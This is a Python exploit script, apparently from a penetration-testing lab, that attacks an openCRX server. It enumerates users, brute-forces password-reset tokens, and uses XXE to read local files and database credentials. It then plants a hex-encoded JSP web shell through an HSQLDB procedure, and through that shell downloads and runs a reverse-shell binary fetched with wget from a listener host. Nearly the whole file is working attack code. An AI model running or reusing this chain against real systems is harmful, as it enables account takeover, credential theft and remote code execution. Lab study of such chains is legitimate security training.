import sys
import re
import os
import base64
import hashlib
import requests
import threading
import time
import calendar
import subprocess
from datetime import datetime
import urllib.parse
import argparse
import zipfile
import time
import random
import string
import itertools
import os
import warnings
from io import BytesIO
from bs4 import BeautifulSoup
from colorama import Fore, Style
import jaydebeapi

warnings.filterwarnings("ignore")
proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}

def format_text(title, item):
    text = Style.BRIGHT + Fore.RED + title + Style.RESET_ALL + ': ' + str(item)
    return text

def user_enumeration(ip, user):
    print('[+] Creating a forgot password request for enumerating the user "%s"...' % user)
    data = {'id': user}
    url = 'http://%s:8080/opencrx-core-CRX/RequestPasswordReset.jsp' % ip

    start_time = int(time.time() * 1000)
    r = requests.post(url, data=data, proxies=proxies)
    end_time = int(time.time() * 1000)

    if 'Password reset request successful for' in r.text:
        print('[+] "%s" is a valid user!' % user)
        return True, start_time, end_time, r.headers.get('Date')
    else:
        print('[-] Failed to determine if "%s" is a valid user...' % user)
        return False, start_time, end_time, r.headers.get('Date')

def reset_password(ip, start_time, end_time, header_time, target_user):

    # Adjust the end_time for buffer
    end_time += 1000

    print('[+] Verifying the request time with response header time...')
    token_file = "tokens.txt"

    pattern = '%a, %d %b %Y %H:%M:%S %Z'
    header_time_parsed = int(calendar.timegm(time.strptime(header_time, pattern))) * 1000

    print('[+] Generating the tokens through Java...')
    try:
        os.remove(token_file)
    except:
        pass
    file_name = "OpenCRXToken.java"
    temp_file_name = file_name.split('.')[0] + "_" + str(header_time_parsed) + ".java"

    with open(file_name, 'r') as file:
        java_content = file.read()

    java_content = java_content.replace("<start_time>", str(start_time))
    java_content = java_content.replace("<end_time>", str(end_time))
    java_content = java_content.replace(file_name.split('.')[0], temp_file_name.split('.')[0])
    
    with open(temp_file_name, 'w') as file:
        file.write(java_content)
    
    subprocess.run("javac %s" % temp_file_name, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    subprocess.run("java %s > %s" % (temp_file_name.split('.')[0], token_file), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

    url = "http://%s:8080/opencrx-core-CRX/PasswordResetConfirm.jsp" % ip
    new_password = "P@ssw0rd2024"
    print('[+] Brute forcing the token...')
    with open(token_file, "r") as f:
        for token in f:
            data = {'t':token.rstrip(), 'p':'CRX','s':'Standard','id':target_user,'password1':new_password,'password2':new_password}
            r = requests.post(url, data=data, proxies=proxies)
            if "Unable to reset password" not in r.text:
                print("[+] Successful reset password of %s to %s with token: %s" % (target_user, new_password, token))
                break

    os.remove(temp_file_name)
    os.remove(temp_file_name.split('.')[0] + '.class')

def xxe_lfi(ip, listener_ip, file_path, verbose=True):
    authorization_header = "guest:P@ssw0rd2024"
    authorization_header_encoded = base64.b64encode(authorization_header.encode()).decode()

    url = "http://%s:8080/opencrx-rest-CRX/org.opencrx.kernel.account1/provider/CRX/segment/Standard/account" % ip
    headers = {"Content-Type": "application/xml","Authorization": "Basic %s" % authorization_header_encoded}
    data = """<?xml version="1.0"?>
<!DOCTYPE data [
<!ENTITY % start "<![CDATA[">
<!ENTITY % file SYSTEM "file://{}" >
<!ENTITY % end "]]>">
<!ENTITY % dtd SYSTEM "http://{}/wrapper.dtd" >
%dtd;
]>
<org.opencrx.kernel.account1.Contact>
  <lastName>&wrapper;</lastName>
  <firstName>Tom</firstName>
</org.opencrx.kernel.account1.Contact>""".format(file_path, listener_ip)

    r = requests.post(url, headers=headers, data=data, proxies=proxies)
    content = r.text.split('FN:Tom ')[1].split('\nEND:VCARD')[0]
    if verbose:
        print(content)
    return content

def get_reverse_shell(ip, listener_ip):
    print('[+] Retrieving database username and password...')
    file_path = "/home/student/crx/data/hsqldb/dbmanager.sh"
    content = xxe_lfi(ip, listener_ip, file_path, False)
    db_user = content.split('--user ')[1].split(' ')[0]
    db_pass = content.split('--password ')[1].rstrip('\n\r')
    print('[+] The database username is %s and the password is %s' % (db_user, db_pass))
    jsp_webshell = "3c2540207061676520696d706f72743d226a6176612e696f2e2a2220253e0a3c250a202020537472696e6720636d64203d20726571756573742e676574506172616d657465722822636d6422293b0a202020537472696e67206f7574707574203d2022223b0a202020696628636d6420213d206e756c6c29207b0a202020202020537472696e672073203d206e756c6c3b0a202020202020747279207b0a20202020202020202050726f636573732070203d2052756e74696d652e67657452756e74696d6528292e6578656328636d64293b0a2020202020202020204275666665726564526561646572207349203d206e6577204275666665726564526561646572286e657720496e70757453747265616d52656164657228702e676574496e70757453747265616d282929293b0a2020202020202020207768696c65282873203d2073492e726561644c696e6528292920213d206e756c6c29207b0a2020202020202020202020206f7574707574202b3d20733b0a2020202020202020207d0a2020202020207d0a202020202020636174636828494f457863657074696f6e206529207b0a202020202020202020652e7072696e74537461636b547261636528293b0a2020202020207d0a2020207d0a253e0a3c7072653e0a3c253d6f757470757420253e0a3c2f7072653e"

    url = 'jdbc:hsqldb:hsql://%s:9001/CRX' % ip
    driver = 'org.hsqldb.jdbc.JDBCDriver'
    jar_file = 'hsqldb.jar'
    conn = jaydebeapi.connect(driver, url, [db_user, db_pass], jar_file)
    cursor = conn.cursor()

    query = "CREATE PROCEDURE writeBytesToFilename(IN paramString VARCHAR, IN paramArrayOfByte VARBINARY(1024)) LANGUAGE JAVA DETERMINISTIC NO SQL EXTERNAL NAME 'CLASSPATH:com.sun.org.apache.xml.internal.security.utils.JavaUtils.writeBytesToFilename'"
    cursor.execute(query)
    query = "call writeBytesToFilename('../../apache-tomee-plus-7.0.5/apps/opencrx-core-CRX/opencrx-core-CRX/shell.jsp', cast('%s' as VARBINARY(1024)))" % jsp_webshell
    cursor.execute(query)

    cursor.close()
    conn.close()
    print('[+] The jsp webshell should be uploaded to http://%s:8080/opencrx-core-CRX/shell.jsp' % ip)
    print('[+] You can run command by: http://%s:8080/opencrx-core-CRX/shell.jsp?cmd=whoami' % ip)
    print('[+] Now triggering the reverse shell, set up a listener on port %s:4444' % listener_ip)

    # Downloading reverse shell
    # msfvenom -p linux/x64/shell_reverse_tcp LHOST=<listener ip> LPORT=4444 -f elf -o reverse.elf
    command = "wget http://%s/reverse.elf -O /tmp/reverse.elf" % listener_ip
    url = 'http://%s:8080/opencrx-core-CRX/shell.jsp?cmd=%s' % (ip, command)
    r = requests.get(url, proxies=proxies)
    command = "chmod 777 /tmp/reverse.elf"
    url = 'http://%s:8080/opencrx-core-CRX/shell.jsp?cmd=%s' % (ip, command)
    r = requests.get(url, proxies=proxies)
    command = "/tmp/reverse.elf"
    url = 'http://%s:8080/opencrx-core-CRX/shell.jsp?cmd=%s' % (ip, command)
    r = requests.get(url, proxies=proxies)


class NewlineFormatter(argparse.RawTextHelpFormatter):
    def _split_lines(self, text, width):
        if text.startswith('R|'):
            return text[2:].splitlines()  
        return argparse.RawTextHelpFormatter._split_lines(self, text, width)

def main():
    parser = argparse.ArgumentParser(description='''
    Usage examples:
      - To execute JavaScript command:
        python script.py -i <IP> -s inject_command -c <some JS command>
      - To get a reverse shell:
        python script.py -i <IP> -s get_reverse_shell -l <Listener IP>

    ''', formatter_class=NewlineFormatter)
    parser.add_argument('-i', '--ip', type=str, required=True, help='IP Address is mandatory')
    parser.add_argument('-s', '--stage', type=str, help='Stage')
    parser.add_argument('-l', '--listener', type=str, help='Listener IP')
    args = parser.parse_args()
    
    if not args.ip:
        parser.print_usage()
        exit(1)

    if (args.stage == "xxe_lfi" or args.stage == "get_reverse_shell") and not args.listener:
        parser.print_usage()
        exit(1)

    elif args.ip and args.stage:
        ip = args.ip
        stage = args.stage

        if stage == "user_enumeration":
            user_enumeration(ip, "guest")

        elif stage == "reset_password":
            target_user = "guest"
            valid_user, start_time, end_time, header_time = user_enumeration(ip, target_user)

            if valid_user:
                reset_password(ip, start_time, end_time, header_time, target_user)

        elif stage == "xxe_lfi":
            listener_ip = args.listener
            file_path = "/home/student/crx/apache-tomee-plus-7.0.5/conf/tomcat-users.xml"
            xxe_lfi(ip, listener_ip, file_path)

        elif stage == "get_reverse_shell":
            listener_ip = args.listener
            target_user = "guest"
            valid_user, start_time, end_time, header_time = user_enumeration(ip, target_user)

            if valid_user:
                reset_password(ip, start_time, end_time, header_time, target_user)

            get_reverse_shell(ip, listener_ip)



    else:
        user_enumeration(ip)
    

if __name__ == "__main__":
    main()
